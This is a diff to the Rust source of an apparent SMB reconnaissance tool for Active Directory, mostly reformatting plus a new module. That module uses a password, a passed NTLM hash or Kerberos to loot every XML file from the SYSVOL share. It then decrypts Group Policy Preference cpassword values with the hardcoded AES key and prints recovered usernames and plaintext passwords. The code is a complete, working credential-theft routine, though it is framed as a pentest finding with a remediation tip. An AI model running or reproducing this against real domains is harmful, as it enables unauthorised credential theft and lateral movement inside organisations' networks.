@@ -1,10 +1,16 @@
+use aes::cipher::{block_padding::Pkcs7, BlockDecryptMut, KeyIvInit};
+use aes::Aes256;
 use anyhow::Result;
+use base64::Engine;
+use cbc::Decryptor;
 use std::io::Cursor;
+use std::path::{Path, PathBuf};
 use tokio::io::{AsyncReadExt, AsyncWriteExt};
 use tokio::net::TcpStream;
 use tokio::process::Command;
 use tokio::time::{timeout, Duration};
 
+use crate::auth_recon::AuthFinding;
 use crate::output;
 
 fn smb_tag_selected(selected: &[String], tag: &str) -> bool {
@@ -91,11 +97,12 @@ pub async fn run_authenticated(
     ntlm_hash: Option<&str>,
     kerberos: bool,
     selected_tags: &[String],
-) -> Result<Vec<String>> {
+) -> Result<SmbAuthResult> {
     output::section("SMB AUTHENTICATED RECON");
     output::info("Attempting authenticated SMB share discovery and listing");
 
     let mut combined = Vec::new();
+    let mut findings = Vec::new();
     let mut methods_attempted = 0usize;
 
     let want_shares = smb_tag_selected(selected_tags, "shares")
@@ -104,17 +111,31 @@ pub async fn run_authenticated(
     let want_list = smb_tag_selected(selected_tags, "list")
         || smb_tag_selected(selected_tags, "share-list")
         || smb_tag_selected(selected_tags, "all");
-    let run_auth_share_checks = want_shares || want_list;
+    let want_gpp = smb_tag_selected(selected_tags, "gpp")
+        || smb_tag_selected(selected_tags, "sysvol")
+        || smb_tag_selected(selected_tags, "all");
+    let run_auth_share_checks = want_shares || want_list || want_gpp;
+    let mut gpp_done = false;
 
     if let Some(pass) = password {
         methods_attempted += 1;
         if run_auth_share_checks {
             let shares = smbclient_list_shares(target, username, Some(pass), None, false).await;
             if let Ok(shares) = shares {
-                output::success(&format!("Password method: discovered {} shares", shares.len()));
+                output::success(&format!(
+                    "Password method: discovered {} shares",
+                    shares.len()
+                ));
                 combined.extend(shares.clone());
                 if want_list {
                     list_share_roots(target, username, Some(pass), None, false, &shares).await;
+                }
+                if want_gpp && !gpp_done {
+                    findings.extend(
+                        enumerate_sysvol_gpp(target, username, Some(pass), None, false, &shares)
+                            .await,
+                    );
+                    gpp_done = true;
                 }
             }
         }
@@ -130,6 +151,13 @@ pub async fn run_authenticated(
                 if want_list {
                     list_share_roots(target, username, None, Some(hash), false, &shares).await;
                 }
+                if want_gpp && !gpp_done {
+                    findings.extend(
+                        enumerate_sysvol_gpp(target, username, None, Some(hash), false, &shares)
+                            .await,
+                    );
+                    gpp_done = true;
+                }
             }
         }
     }
@@ -139,10 +167,18 @@ pub async fn run_authenticated(
         if run_auth_share_checks {
             let shares = smbclient_list_shares(target, username, None, None, true).await;
             if let Ok(shares) = shares {
-                output::success(&format!("Kerberos method: discovered {} shares", shares.len()));
+                output::success(&format!(
+                    "Kerberos method: discovered {} shares",
+                    shares.len()
+                ));
                 combined.extend(shares.clone());
                 if want_list {
                     list_share_roots(target, username, None, None, true, &shares).await;
+                }
+                if want_gpp && !gpp_done {
+                    findings.extend(
+                        enumerate_sysvol_gpp(target, username, None, None, true, &shares).await,
+                    );
                 }
             }
         }
@@ -156,7 +192,16 @@ pub async fn run_authenticated(
 
     combined.sort();
     combined.dedup();
-    Ok(combined)
+    Ok(SmbAuthResult {
+        shares: combined,
+        findings,
+    })
+}
+
+#[derive(Debug, Default)]
+pub struct SmbAuthResult {
+    pub shares: Vec<String>,
+    pub findings: Vec<AuthFinding>,
 }
 
 /// NTLM info extracted from Type 2 message
@@ -224,7 +269,7 @@ fn build_ntlmssp_negotiate(session_id: u64) -> Vec<u8> {
     let mut ntlmssp = Vec::new();
     ntlmssp.extend_from_slice(b"NTLMSSP\x00"); // Signature
     ntlmssp.extend_from_slice(&1u32.to_le_bytes()); // Type 1
-    // Flags: NEGOTIATE_UNICODE | NEGOTIATE_OEM | REQUEST_TARGET | NEGOTIATE_NTLM | NEGOTIATE_ALWAYS_SIGN | NEGOTIATE_56 | NEGOTIATE_128
+                                                    // Flags: NEGOTIATE_UNICODE | NEGOTIATE_OEM | REQUEST_TARGET | NEGOTIATE_NTLM | NEGOTIATE_ALWAYS_SIGN | NEGOTIATE_56 | NEGOTIATE_128
     let flags: u32 = 0xe2088297;
     ntlmssp.extend_from_slice(&flags.to_le_bytes());
     // Domain name fields (empty)
@@ -276,7 +321,9 @@ fn build_ntlmssp_negotiate(session_id: u64) -> Vec<u8> {
 /// Build a minimal SPNEGO NegTokenInit wrapping the NTLMSSP token
 fn build_spnego_init(ntlmssp: &[u8]) -> Vec<u8> {
     // mechType OID for NTLMSSP: 1.3.6.1.4.1.311.2.2.10
-    let mech_oid: &[u8] = &[0x06, 0x0a, 0x2b, 0x06, 0x01, 0x04, 0x01, 0x82, 0x37, 0x02, 0x02, 0x0a];
+    let mech_oid: &[u8] = &[
+        0x06, 0x0a, 0x2b, 0x06, 0x01, 0x04, 0x01, 0x82, 0x37, 0x02, 0x02, 0x0a,
+    ];
     let mech_types = asn1_sequence(mech_oid);
     let mech_types_ctx = asn1_context_tag(0, &mech_types);
 
@@ -463,8 +510,8 @@ fn parse_av_pairs(data: &[u8], info: &mut NtlmInfo) {
                 // MsvAvTimestamp (FILETIME - 100ns intervals since Jan 1 1601)
                 if value.len() >= 8 {
                     let filetime = u64::from_le_bytes([
-                        value[0], value[1], value[2], value[3],
-                        value[4], value[5], value[6], value[7],
+                        value[0], value[1], value[2], value[3], value[4], value[5], value[6],
+                        value[7],
                     ]);
                     // Convert to Unix timestamp
                     let unix_ts = (filetime / 10_000_000).saturating_sub(11644473600);
@@ -513,7 +560,16 @@ fn chrono_from_unix(ts: u64) -> String {
     let days_in_month = [
         31,
         if leap { 29 } else { 28 },
-        31, 30, 31, 30, 31, 31, 30, 31, 30, 31,
+        31,
+        30,
+        31,
+        30,
+        31,
+        31,
+        30,
+        31,
+        30,
+        31,
     ];
     let mut m = 0;
     for (i, &dim) in days_in_month.iter().enumerate() {
@@ -535,9 +591,7 @@ fn chrono_from_unix(ts: u64) -> String {
 }
 
 fn find_bytes(haystack: &[u8], needle: &[u8]) -> Option<usize> {
-    haystack
-        .windows(needle.len())
-        .position(|w| w == needle)
+    haystack.windows(needle.len()).position(|w| w == needle)
 }
 
 fn build_smb1_negotiate() -> Vec<u8> {
@@ -582,7 +636,13 @@ async fn check_smb_signing(target: &str, port: u16) {
     output::info("Checking SMB signing requirements...");
 
     let addr = format!("{}:{}", target, port);
-    let Ok(mut stream) = timeout(Duration::from_secs(5), TcpStream::connect(&addr)).await.unwrap_or(Err(std::io::Error::new(std::io::ErrorKind::TimedOut, "timeout"))) else {
+    let Ok(mut stream) = timeout(Duration::from_secs(5), TcpStream::connect(&addr))
+        .await
+        .unwrap_or(Err(std::io::Error::new(
+            std::io::ErrorKind::TimedOut,
+            "timeout",
+        )))
+    else {
         output::fail("Could not connect for signing check");
         return;
     };
@@ -593,7 +653,13 @@ async fn check_smb_signing(target: &str, port: u16) {
     }
 
     let mut buf = vec![0u8; 8192];
-    let Ok(n) = timeout(Duration::from_secs(5), stream.read(&mut buf)).await.unwrap_or(Err(std::io::Error::new(std::io::ErrorKind::TimedOut, "timeout"))) else {
+    let Ok(n) = timeout(Duration::from_secs(5), stream.read(&mut buf))
+        .await
+        .unwrap_or(Err(std::io::Error::new(
+            std::io::ErrorKind::TimedOut,
+            "timeout",
+        )))
+    else {
         return;
     };
 
@@ -662,7 +728,13 @@ async fn check_null_session(target: &str, port: u16) {
     output::info("Checking for null session / guest access...");
 
     let addr = format!("{}:{}", target, port);
-    let Ok(mut stream) = timeout(Duration::from_secs(5), TcpStream::connect(&addr)).await.unwrap_or(Err(std::io::Error::new(std::io::ErrorKind::TimedOut, "timeout"))) else {
+    let Ok(mut stream) = timeout(Duration::from_secs(5), TcpStream::connect(&addr))
+        .await
+        .unwrap_or(Err(std::io::Error::new(
+            std::io::ErrorKind::TimedOut,
+            "timeout",
+        )))
+    else {
         output::fail("Could not connect for null session check");
         return;
     };
@@ -689,7 +761,13 @@ async fn check_null_session(target: &str, port: u16) {
     }
 
     let mut buf = vec![0u8; 8192];
-    let Ok(n) = timeout(Duration::from_secs(5), stream.read(&mut buf)).await.unwrap_or(Err(std::io::Error::new(std::io::ErrorKind::TimedOut, "timeout"))) else {
+    let Ok(n) = timeout(Duration::from_secs(5), stream.read(&mut buf))
+        .await
+        .unwrap_or(Err(std::io::Error::new(
+            std::io::ErrorKind::TimedOut,
+            "timeout",
+        )))
+    else {
         return;
     };
 
@@ -722,10 +800,7 @@ async fn check_null_session(target: &str, port: u16) {
                 output::info("STATUS_MORE_PROCESSING_REQUIRED — multi-step auth in progress");
             }
             _ => {
-                output::info(&format!(
-                    "NT Status: 0x{:08x}",
-                    nt_status
-                ));
+                output::info(&format!("NT Status: 0x{:08x}", nt_status));
             }
         }
     }
@@ -769,7 +844,10 @@ async fn enumerate_null_shares(target: &str) {
         return;
     }
 
-    output::success(&format!("Anonymous share listing returned {} entries", shares.len()));
+    output::success(&format!(
+        "Anonymous share listing returned {} entries",
+        shares.len()
+    ));
     for share in shares {
         output::kv("Share", &share);
     }
@@ -853,7 +931,9 @@ async fn list_share_roots(
         }
 
         let mut cmd = Command::new("smbclient");
-        cmd.arg(format!("//{}/{}", target, share_name)).arg("-c").arg("ls");
+        cmd.arg(format!("//{}/{}", target, share_name))
+            .arg("-c")
+            .arg("ls");
 
         if kerberos {
             cmd.arg("-k").arg("-U").arg(username);
@@ -905,9 +985,7 @@ async fn list_share_roots(
                     || combined.contains("logon failure")
                 {
                     "logon failure"
-                } else if combined.contains("bad network name")
-                    || combined.contains("not found")
-                {
+                } else if combined.contains("bad network name") || combined.contains("not found") {
                     "share not found"
                 } else {
                     "not readable"
@@ -948,4 +1026,250 @@ fn parse_smbclient_ls_entries(output: &str) -> Vec<String> {
     entries.sort();
     entries.dedup();
     entries
+}
+
+async fn enumerate_sysvol_gpp(
+    target: &str,
+    username: &str,
+    password: Option<&str>,
+    ntlm_hash: Option<&str>,
+    kerberos: bool,
+    shares: &[String],
+) -> Vec<AuthFinding> {
+    let sysvol_present = shares.iter().any(|s| {
+        s.split_whitespace()
+            .next()
+            .is_some_and(|name| name.eq_ignore_ascii_case("SYSVOL"))
+    });
+    if !sysvol_present {
+        output::info("SYSVOL share not accessible via current SMB auth method");
+        return Vec::new();
+    }
+
+    let loot_dir = PathBuf::from("sysvol_loot");
+    if let Err(e) = std::fs::create_dir_all(&loot_dir) {
+        output::warning(&format!("Failed to create SYSVOL loot dir: {}", e));
+        return Vec::new();
+    }
+
+    output::info("Attempting SYSVOL XML loot for GPP credential discovery");
+    let mut cmd = Command::new("smbclient");
+    cmd.arg(format!("//{}/SYSVOL", target))
+        .arg("-c")
+        .arg(format!(
+            "lcd {}; prompt OFF; recurse ON; mask *.xml; mget *",
+            loot_dir.display()
+        ));
+    add_smbclient_auth(&mut cmd, username, password, ntlm_hash, kerberos);
+
+    let out = match timeout(Duration::from_secs(45), cmd.output()).await {
+        Err(_) => {
+            output::warning("SYSVOL XML loot timed out");
+            return Vec::new();
+        }
+        Ok(Err(e)) => {
+            output::warning(&format!("Could not run smbclient for SYSVOL loot ({})", e));
+            return Vec::new();
+        }
+        Ok(Ok(out)) => out,
+    };
+
+    if !out.status.success() {
+        let stderr = String::from_utf8_lossy(&out.stderr);
+        if !stderr.trim().is_empty() {
+            output::warning(&format!("SYSVOL loot failed: {}", stderr.trim()));
+        } else {
+            output::warning("SYSVOL loot failed");
+        }
+        return Vec::new();
+    }
+
+    let xml_files = collect_xml_files(&loot_dir);
+    if xml_files.is_empty() {
+        output::warning("SYSVOL loot completed but no XML files were downloaded");
+        return Vec::new();
+    }
+    output::success(&format!("Downloaded {} SYSVOL XML files", xml_files.len()));
+
+    let findings = scan_gpp_cpasswords(&xml_files);
+    if findings.is_empty() {
+        output::info("No GPP cpassword values found in looted SYSVOL XML files");
+        return Vec::new();
+    }
+
+    output::warning(&format!(
+        "Potential GPP credentials found in {} files",
+        findings.len()
+    ));
+    for finding in findings.iter().take(10) {
+        output::kv(
+            "GPP",
+            &format!(
+                "{} | user={} | password={}",
+                finding.path,
+                finding.username.as_deref().unwrap_or("<unknown>"),
+                finding.password.as_deref().unwrap_or("<undecoded>")
+            ),
+        );
+    }
+
+    findings
+        .into_iter()
+        .map(|finding| AuthFinding {
+            id: "SMB-GPP-CPASSWORD".to_string(),
+            severity: "high".to_string(),
+            title: "GPP cpassword recovered from SYSVOL".to_string(),
+            evidence: format!(
+                "{} | user={} | password={}",
+                finding.path,
+                finding.username.as_deref().unwrap_or("<unknown>"),
+                finding.password.as_deref().unwrap_or("<undecoded>")
+            ),
+            recommendation:
+                "Remove legacy Group Policy Preference passwords and rotate any exposed accounts."
+                    .to_string(),
+        })
+        .collect()
+}
+
+fn add_smbclient_auth(
+    cmd: &mut Command,
+    username: &str,
+    password: Option<&str>,
+    ntlm_hash: Option<&str>,
+    kerberos: bool,
+) {
+    if kerberos {
+        cmd.arg("-k").arg("-U").arg(username);
+    } else if let Some(hash) = ntlm_hash {
+        let hash_fmt = if hash.contains(':') {
+            hash.to_string()
+        } else {
+            format!("aad3b435b51404eeaad3b435b51404ee:{}", hash)
+        };
+        cmd.arg("-U").arg(format!("{}%{}", username, hash_fmt));
+        cmd.arg("--pw-nt-hash");
+    } else if let Some(pass) = password {
+        cmd.arg("-U").arg(format!("{}%{}", username, pass));
+    } else {
+        cmd.arg("-N");
+    }
+}
+
+fn collect_xml_files(base: &Path) -> Vec<PathBuf> {
+    let mut out = Vec::new();
+    let mut pending = vec![base.to_path_buf()];
+    while let Some(dir) = pending.pop() {
+        let Ok(entries) = std::fs::read_dir(&dir) else {
+            continue;
+        };
+        for entry in entries.flatten() {
+            let path = entry.path();
+            let Ok(meta) = entry.metadata() else {
+                continue;
+            };
+            if meta.is_dir() {
+                pending.push(path);
+                continue;
+            }
+            if meta.is_file()
+                && path
+                    .extension()
+                    .and_then(|ext| ext.to_str())
+                    .is_some_and(|ext| ext.eq_ignore_ascii_case("xml"))
+            {
+                out.push(path);
+            }
+        }
+    }
+    out.sort();
+    out
+}
+
+struct GppFinding {
+    path: String,
+    username: Option<String>,
+    password: Option<String>,
+}
+
+fn scan_gpp_cpasswords(files: &[PathBuf]) -> Vec<GppFinding> {
+    let mut findings = Vec::new();
+    for path in files {
+        let Ok(content) = std::fs::read_to_string(path) else {
+            continue;
+        };
+        let Some(cpassword) = extract_xml_attr(&content, "cpassword") else {
+            continue;
+        };
+        let username = extract_xml_attr(&content, "userName")
+            .or_else(|| extract_xml_attr(&content, "username"))
+            .or_else(|| extract_xml_attr(&content, "newName"));
+        findings.push(GppFinding {
+            path: path.display().to_string(),
+            username,
+            password: decrypt_gpp_cpassword(&cpassword),
+        });
+    }
+    findings
+}
+
+fn extract_xml_attr(content: &str, attr: &str) -> Option<String> {
+    let patterns = [format!(r#"{}=""#, attr), format!(r#"{} = ""#, attr)];
+    for pattern in patterns {
+        if let Some(start) = content.find(&pattern) {
+            let rest = &content[start + pattern.len()..];
+            if let Some(end) = rest.find('"') {
+                let value = rest[..end].trim();
+                if !value.is_empty() {
+                    return Some(value.to_string());
+                }
+            }
+        }
+    }
+    None
+}
+
+fn decrypt_gpp_cpassword(cpassword: &str) -> Option<String> {
+    const GPP_KEY: [u8; 32] = [
+        0x4e, 0x99, 0x06, 0xe8, 0xfc, 0xb6, 0x6c, 0xc9, 0xfa, 0xf4, 0x93, 0x10, 0x62, 0x0f, 0xfe,
+        0xe8, 0xf4, 0x96, 0xe8, 0x06, 0xcc, 0x05, 0x79, 0x90, 0x20, 0x9b, 0x09, 0xa4, 0x33, 0xb6,
+        0x6c, 0x1b,
+    ];
+    let mut padded = cpassword.trim().to_string();
+    while !padded.len().is_multiple_of(4) {
+        padded.push('=');
+    }
+
+    let mut ciphertext = base64::engine::general_purpose::STANDARD
+        .decode(padded.as_bytes())
+        .ok()?;
+    let iv = [0u8; 16];
+    let decrypted = Decryptor::<Aes256>::new(&GPP_KEY.into(), &iv.into())
+        .decrypt_padded_mut::<Pkcs7>(&mut ciphertext)
+        .ok()?;
+
+    if decrypted.len() % 2 != 0 {
+        return None;
+    }
+    let utf16 = decrypted
+        .chunks_exact(2)
+        .map(|chunk| u16::from_le_bytes([chunk[0], chunk[1]]))
+        .collect::<Vec<_>>();
+    Some(
+        String::from_utf16_lossy(&utf16)
+            .trim_end_matches('\u{0}')
+            .to_string(),
+    )
+}
+
+#[cfg(test)]
+mod tests {
+    use super::extract_xml_attr;
+
+    #[test]
+    fn extracts_xml_attribute_values() {
+        let xml = r#"<User userName="alice" cpassword="AQID" />"#;
+        assert_eq!(extract_xml_attr(xml, "userName").as_deref(), Some("alice"));
+        assert_eq!(extract_xml_attr(xml, "cpassword").as_deref(), Some("AQID"));
+    }
 }
